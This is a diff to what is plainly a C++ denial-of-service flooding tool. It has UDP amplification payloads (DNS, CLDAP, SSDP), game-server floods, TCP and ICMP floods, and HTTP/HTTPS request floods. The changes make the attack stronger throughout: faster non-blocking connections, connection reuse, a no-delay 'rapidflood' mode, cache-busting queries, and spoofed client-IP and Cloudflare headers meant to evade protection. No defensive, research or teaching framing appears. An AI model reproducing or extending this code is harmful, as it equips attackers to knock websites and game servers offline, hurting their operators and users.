@@ -8,6 +8,7 @@
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
+#include <netinet/tcp.h>
 #ifndef NO_SSL
 #include <openssl/err.h>
 #include <openssl/ssl.h>
@@ -16,6 +17,7 @@
 #include <string>
 #include <sys/socket.h>
 #include <sys/types.h>
+#include <poll.h>
 #include <thread>
 #include <unistd.h>
 #include <vector>
@@ -33,12 +35,14 @@ static inline std::string trim(const std::string &s) {
 
 static void parse_url(const std::string &url_in, std::string &host, std::string &path, int &port, int default_port) {
     std::string url = trim(url_in);
+    bool scheme_https = false;
+    bool scheme_http = false;
     size_t scheme_pos = url.find("://");
     if (scheme_pos != std::string::npos) {
         std::string scheme = url.substr(0, scheme_pos);
         for (auto &c : scheme) c = std::tolower(c);
-        if (scheme == "https") default_port = 443;
-        else if (scheme == "http") default_port = 80;
+        if (scheme == "https") scheme_https = true;
+        else if (scheme == "http") scheme_http = true;
         url = url.substr(scheme_pos + 3);
     }
 
@@ -56,7 +60,11 @@ static void parse_url(const std::string &url_in, std::string &host, std::string 
         port = std::atoi(host.substr(colon_pos + 1).c_str());
         host = host.substr(0, colon_pos);
     } else {
-        if (port <= 0) port = default_port;
+        if (port <= 0) {
+            if (scheme_https) port = 443;
+            else if (scheme_http) port = 80;
+            else port = default_port;
+        }
     }
 
     host = trim(host);
@@ -115,6 +123,48 @@ static std::string get_random_referer(const std::string &host) {
     return REFERERS[dist(gen)] + host;
 }
 
+static int connect_with_timeout(const struct sockaddr_in &sin, int timeout_sec = 3) {
+    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock < 0) return -1;
+
+    int flags = fcntl(sock, F_GETFL, 0);
+    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+
+    int res = connect(sock, (struct sockaddr *)&sin, sizeof(sin));
+    if (res < 0) {
+        if (errno != EINPROGRESS) {
+            close(sock);
+            return -1;
+        }
+
+        struct pollfd pfd{};
+        pfd.fd = sock;
+        pfd.events = POLLOUT;
+        int poll_res = poll(&pfd, 1, timeout_sec * 1000);
+        if (poll_res <= 0) {
+            close(sock);
+            return -1;
+        }
+
+        int err = 0;
+        socklen_t len = sizeof(err);
+        if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &len) < 0 || err != 0) {
+            close(sock);
+            return -1;
+        }
+    }
+
+    fcntl(sock, F_SETFL, flags);
+    struct timeval tv{2, 0};
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
+    int one = 1;
+    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
+
+    return sock;
+}
+
 // ==================== LAYER 4 UDP FLOODS ====================
 static void worker_udp(const std::string &method, const std::string &target_ip, int port) {
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
@@ -131,7 +181,6 @@ static void worker_udp(const std::string &method, const std::string &target_ip, 
         std::vector<uint8_t> payload;
 
         if (method == "dns") {
-            // DNS Standard Query payload for root/random query
             uint8_t dns_packet[] = {
                 0x13, 0x37, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x03, 'w', 'w', 'w',
@@ -140,7 +189,6 @@ static void worker_udp(const std::string &method, const std::string &target_ip, 
             };
             payload.assign(dns_packet, dns_packet + sizeof(dns_packet));
         } else if (method == "ldap") {
-            // CLDAP search query
             uint8_t ldap_packet[] = {
                 0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04,
                 0x00, 0x0a, 0x01, 0x00, 0x0a, 0x01, 0x00, 0x02,
@@ -150,7 +198,6 @@ static void worker_udp(const std::string &method, const std::string &target_ip, 
             };
             payload.assign(ldap_packet, ldap_packet + sizeof(ldap_packet));
         } else if (method == "ssdp") {
-            // SSDP discovery request
             std::string ssdp_req = "M-SEARCH * HTTP/1.1\r\n"
                                    "HOST: 239.255.255.250:1900\r\n"
                                    "MAN: \"ssdp:discover\"\r\n"
@@ -163,7 +210,6 @@ static void worker_udp(const std::string &method, const std::string &target_ip, 
             payload.resize(p_size);
             for (size_t i = 0; i < p_size; ++i) payload[i] = (uint8_t)(gen() & 0xFF);
         } else {
-            // Default UDP flood
             payload.resize(1024);
             for (size_t i = 0; i < 1024; ++i) payload[i] = (uint8_t)(gen() & 0xFF);
         }
@@ -197,20 +243,16 @@ static void worker_game(const std::string &method, const std::string &target_ip,
         std::vector<uint8_t> payload;
 
         if (method == "samp") {
-            // SA-MP Query Packet
             uint8_t samp_pkt[] = {'S', 'A', 'M', 'P', 127, 0, 0, 1, 0, 0, 'i'};
             payload.assign(samp_pkt, samp_pkt + sizeof(samp_pkt));
         } else if (method == "counter") {
-            // Valve Source A2S_INFO query
             uint8_t cs_pkt[] = {0xFF, 0xFF, 0xFF, 0xFF, 0x54, 'S', 'o', 'u', 'r', 'c', 'e', ' ',
                                 'E',  'n',  'g',  'i',  'n',  'e', ' ', 'Q', 'u', 'e', 'r', 'y', 0x00};
             payload.assign(cs_pkt, cs_pkt + sizeof(cs_pkt));
         } else if (method == "fivem") {
-            // FiveM getendpoints / getinfo
             std::string fm = "\xFF\xFF\xFF\xFFgetinfo xxx";
             payload.assign(fm.begin(), fm.end());
         } else if (method == "roblox") {
-            // RakNet Open Connection Request
             uint8_t raknet_req[] = {
                 0x05, 0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE,
                 0xFE, 0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56,
@@ -218,7 +260,6 @@ static void worker_game(const std::string &method, const std::string &target_ip,
             };
             payload.assign(raknet_req, raknet_req + sizeof(raknet_req));
         } else {
-            // Generic / pubg / fortnite / warthunder / rocket / rainbow game packet
             payload.resize(512);
             for (size_t i = 0; i < 512; ++i) payload[i] = (uint8_t)(gen() & 0xFF);
         }
@@ -259,7 +300,6 @@ static void worker_tcp(const std::string &method, const std::string &target_ip, 
 
 // ==================== LAYER 3 FLOODS ====================
 static void worker_layer3(const std::string &method, const std::string &target_ip, int port) {
-    // Attempt raw socket, otherwise fallback to UDP
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     bool is_raw = (sock >= 0);
     if (!is_raw) {
@@ -299,45 +339,58 @@ static void worker_layer3(const std::string &method, const std::string &target_i
 }
 
 // ==================== LAYER 7 HTTP / HTTPS FLOODS ====================
-static std::string build_http_request(const std::string &method, const std::string &host, const std::string &path) {
+static std::string build_http_request(const std::string &method, const std::string &host, const std::string &path, int port) {
     std::string req_path = path;
     if (method == "cache" || method == "bypass" || method == "cloudflare" || method == "tlsx" || method == "httpx" || method == "rapidflood") {
-        req_path += (req_path.find('?') == std::string::npos ? "?" : "&") + random_string(8) + "=" + random_string(8);
+        std::string sep = (req_path.find('?') == std::string::npos) ? "?" : "&";
+        req_path += sep + random_string(6) + "=" + random_string(8);
     }
 
-    std::string req = "GET " + req_path + " HTTP/1.1\r\n"
-                      "Host: " + host + "\r\n"
-                      "User-Agent: " + get_random_user_agent() + "\r\n"
-                      "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
-                      "Accept-Language: en-US,en;q=0.9,id;q=0.8\r\n"
-                      "Accept-Encoding: gzip, deflate, br\r\n"
-                      "Cache-Control: max-age=0\r\n"
-                      "Sec-Ch-Ua: \"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not-A.Brand\";v=\"99\"\r\n"
-                      "Sec-Ch-Ua-Mobile: ?0\r\n"
-                      "Sec-Ch-Ua-Platform: \"Linux\"\r\n"
-                      "Sec-Fetch-Dest: document\r\n"
-                      "Sec-Fetch-Mode: navigate\r\n"
-                      "Sec-Fetch-Site: none\r\n"
-                      "Sec-Fetch-User: ?1\r\n"
-                      "Upgrade-Insecure-Requests: 1\r\n"
-                      "Referer: " + get_random_referer(host) + "\r\n"
-                      "Connection: keep-alive\r\n";
+    std::string host_header = host;
+    if (port != 80 && port != 443 && port > 0) {
+        host_header += ":" + std::to_string(port);
+    }
+
+    std::string req;
+    req.reserve(1024);
+    req += "GET " + req_path + " HTTP/1.1\r\n";
+    req += "Host: " + host_header + "\r\n";
+    req += "User-Agent: " + get_random_user_agent() + "\r\n";
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n";
+    req += "Accept-Language: en-US,en;q=0.9\r\n";
+    req += "Accept-Encoding: gzip, deflate, br\r\n";
+    req += "Sec-Ch-Ua: \"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not-A.Brand\";v=\"99\"\r\n";
+    req += "Sec-Ch-Ua-Mobile: ?0\r\n";
+    req += "Sec-Ch-Ua-Platform: \"Linux\"\r\n";
+    req += "Sec-Fetch-Dest: document\r\n";
+    req += "Sec-Fetch-Mode: navigate\r\n";
+    req += "Sec-Fetch-Site: none\r\n";
+    req += "Sec-Fetch-User: ?1\r\n";
+    req += "Upgrade-Insecure-Requests: 1\r\n";
+    req += "Referer: " + get_random_referer(host) + "\r\n";
+
+    if (method == "cache" || method == "bypass" || method == "cloudflare") {
+        req += "Cache-Control: no-cache, no-store, must-revalidate, max-age=0\r\n";
+        req += "Pragma: no-cache\r\n";
+    } else {
+        req += "Cache-Control: max-age=0\r\n";
+    }
 
     if (method == "bypass" || method == "cloudflare" || method == "tlsx") {
         std::string fake_ip = random_ip();
-        req += "X-Forwarded-For: " + fake_ip + "\r\n"
-               "CF-Connecting-IP: " + fake_ip + "\r\n"
-               "X-Real-IP: " + fake_ip + "\r\n"
-               "X-Client-IP: " + fake_ip + "\r\n"
-               "True-Client-IP: " + fake_ip + "\r\n";
+        req += "X-Forwarded-For: " + fake_ip + "\r\n";
+        req += "CF-Connecting-IP: " + fake_ip + "\r\n";
+        req += "X-Real-IP: " + fake_ip + "\r\n";
+        req += "X-Client-IP: " + fake_ip + "\r\n";
+        req += "True-Client-IP: " + fake_ip + "\r\n";
     }
 
-    if (method == "cache" || method == "bypass" || method == "cloudflare") {
-        req += "Cache-Control: no-cache, no-store, must-revalidate, max-age=0\r\n"
-               "Pragma: no-cache\r\n";
+    if (method == "cloudflare") {
+        req += "CF-Visitor: {\"scheme\":\"https\"}\r\n";
+        req += "CF-IPCountry: US\r\n";
     }
 
-    req += "\r\n";
+    req += "Connection: keep-alive\r\n\r\n";
     return req;
 }
 
@@ -345,30 +398,28 @@ static void worker_http(const std::string &method, const std::string &host, cons
     struct sockaddr_in sin{};
     sin.sin_family = AF_INET;
     sin.sin_port = htons(port > 0 ? port : 80);
-    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);
+    if (inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr) <= 0) return;
 
     while (g_running.load(std::memory_order_relaxed)) {
-        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        int sock = connect_with_timeout(sin, 3);
         if (sock < 0) {
-            std::this_thread::yield();
+            std::this_thread::sleep_for(std::chrono::milliseconds(50));
             continue;
         }
 
-        struct timeval tv{2, 0};
-        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
-        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+        // Connection reuse loop
+        for (int r = 0; r < 64 && g_running.load(std::memory_order_relaxed); ++r) {
+            std::string req = build_http_request(method, host, path, port);
+            ssize_t sent = send(sock, req.c_str(), req.size(), MSG_NOSIGNAL);
+            if (sent <= 0) break;
+            g_total_packets.fetch_add(1, std::memory_order_relaxed);
 
-        if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == 0) {
-            // Keep-Alive connection reuse loop
-            for (int r = 0; r < 64 && g_running.load(std::memory_order_relaxed); ++r) {
-                std::string req = build_http_request(method, host, path);
-                ssize_t sent = send(sock, req.c_str(), req.size(), MSG_NOSIGNAL);
-                if (sent <= 0) break;
-                g_total_packets.fetch_add(1, std::memory_order_relaxed);
+            // Drain any pending responses without blocking
+            char drain[1024];
+            while (recv(sock, drain, sizeof(drain), MSG_DONTWAIT) > 0) {}
 
-                char drain[512];
-                recv(sock, drain, sizeof(drain), MSG_DONTWAIT);
-                std::this_thread::sleep_for(std::chrono::milliseconds(2));
+            if (method != "rapidflood") {
+                std::this_thread::yield();
             }
         }
         close(sock);
@@ -377,45 +428,64 @@ static void worker_http(const std::string &method, const std::string &host, cons
 
 #ifndef NO_SSL
 static void worker_https(const std::string &method, SSL_CTX *ctx, const std::string &host, const std::string &target_ip, int port, const std::string &path) {
+    if (!ctx) return;
+
     struct sockaddr_in sin{};
     sin.sin_family = AF_INET;
     sin.sin_port = htons(port > 0 ? port : 443);
-    inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);
+    if (inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr) <= 0) return;
 
     while (g_running.load(std::memory_order_relaxed)) {
-        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        int sock = connect_with_timeout(sin, 3);
         if (sock < 0) {
-            std::this_thread::yield();
+            std::this_thread::sleep_for(std::chrono::milliseconds(50));
             continue;
         }
 
-        struct timeval tv{2, 0};
-        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
-        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+        SSL *ssl = SSL_new(ctx);
+        if (!ssl) {
+            close(sock);
+            continue;
+        }
 
-        if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == 0) {
-            SSL *ssl = SSL_new(ctx);
-            if (ssl) {
-                SSL_set_fd(ssl, sock);
-                SSL_set_tlsext_host_name(ssl, host.c_str());
+        SSL_set_fd(ssl, sock);
 
-                if (SSL_connect(ssl) > 0) {
-                    // Keep-Alive connection reuse loop
-                    for (int r = 0; r < 64 && g_running.load(std::memory_order_relaxed); ++r) {
-                        std::string req = build_http_request(method, host, path);
-                        int sent = SSL_write(ssl, req.c_str(), (int)req.size());
-                        if (sent <= 0) break;
-                        g_total_packets.fetch_add(1, std::memory_order_relaxed);
+        // Only set SNI if host is not an IP address
+        struct in_addr addr_test;
+        if (inet_pton(AF_INET, host.c_str(), &addr_test) != 1) {
+            SSL_set_tlsext_host_name(ssl, host.c_str());
+        }
 
-                        char drain[512];
-                        SSL_read(ssl, drain, sizeof(drain));
-                        std::this_thread::sleep_for(std::chrono::milliseconds(2));
-                    }
+        if (SSL_connect(ssl) > 0) {
+            // Keep-Alive connection reuse loop
+            for (int r = 0; r < 64 && g_running.load(std::memory_order_relaxed); ++r) {
+                std::string req = build_http_request(method, host, path, port);
+                int sent = SSL_write(ssl, req.c_str(), (int)req.size());
+                if (sent <= 0) break;
+                g_total_packets.fetch_add(1, std::memory_order_relaxed);
+
+                // Drain any pending responses WITHOUT blocking
+                while (SSL_pending(ssl) > 0) {
+                    char drain[1024];
+                    if (SSL_read(ssl, drain, sizeof(drain)) <= 0) break;
                 }
-                SSL_shutdown(ssl);
-                SSL_free(ssl);
+
+                struct pollfd pfd{};
+                pfd.fd = sock;
+                pfd.events = POLLIN;
+                if (poll(&pfd, 1, 0) > 0 && (pfd.revents & POLLIN)) {
+                    char drain[1024];
+                    SSL_read(ssl, drain, sizeof(drain));
+                }
+
+                if (method != "rapidflood") {
+                    std::this_thread::yield();
+                }
             }
         }
+
+        SSL_shutdown(ssl);
+        SSL_free(ssl);
         close(sock);
     }
 }
@@ -428,7 +498,6 @@ static void worker_https(const std::string &method, void *ctx, const std::string
 
 // ==================== MAIN DISPATCHER ====================
 int main(int argc, char *argv[]) {
-    // Determine method name from argv[0] or first argument
     char prog_path[512];
     strncpy(prog_path, argv[0], sizeof(prog_path) - 1);
     std::string method = basename(prog_path);
@@ -472,6 +541,7 @@ int main(int argc, char *argv[]) {
     std::cout << "[+] Method   : " << method << "\n";
     std::cout << "[+] Target   : " << host << " (" << target_ip << ")\n";
     std::cout << "[+] Port     : " << port << "\n";
+    std::cout << "[+] Path     : " << path << "\n";
     std::cout << "[+] Duration : " << duration << "s\n";
     std::cout << "[+] Threads  : " << threads << "\n";
 
@@ -483,6 +553,10 @@ int main(int argc, char *argv[]) {
     SSL_CTX *ssl_ctx = SSL_CTX_new(ssl_method);
     if (ssl_ctx) {
         SSL_CTX_set_verify(ssl_ctx, SSL_VERIFY_NONE, NULL);
+        SSL_CTX_set_options(ssl_ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_COMPRESSION);
+        SSL_CTX_set_cipher_list(ssl_ctx, "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:HIGH:!aNULL:!MD5:!RC4");
+        const unsigned char alpn_protos[] = {8, 'h', 't', 't', 'p', '/', '1', '.', '1'};
+        SSL_CTX_set_alpn_protos(ssl_ctx, alpn_protos, sizeof(alpn_protos));
     }
 #else
     void *ssl_ctx = nullptr;
@@ -491,7 +565,7 @@ int main(int argc, char *argv[]) {
     std::vector<std::thread> thread_pool;
 
     bool is_https = (method == "https" || method == "tls" || method == "tlsx" || port == 443 || (raw_target.rfind("https://", 0) == 0));
-    bool is_http = (method == "http" || method == "httpx" || method == "rapidflood" || method == "browser" || method == "cache" || method == "bypass" || method == "cloudflare");
+    bool is_http = (method == "http" || method == "httpx" || method == "rapidflood" || method == "browser" || method == "cache" || method == "bypass" || method == "cloudflare" || method == "get" || method == "post" || method == "head");
     bool is_game = (method == "game" || method == "rainbow" || method == "rocket" || method == "roblox" || method == "fivem" || method == "pubg" || method == "fortnite" || method == "warthunder" || method == "counter" || method == "samp");
     bool is_tcp = (method == "tcp" || method == "socket" || method == "ovh" || method == "tcpmix" || method == "tcpbypass" || method == "ack");
     bool is_l3 = (method == "icmp" || method == "subnet");
@@ -508,7 +582,6 @@ int main(int argc, char *argv[]) {
         } else if (is_l3) {
             thread_pool.emplace_back(worker_layer3, method, target_ip, port);
         } else {
-            // Default UDP (dns, udp, ldap, ssdp, home, udpbypass, etc.)
             thread_pool.emplace_back(worker_udp, method, target_ip, port);
         }
     }
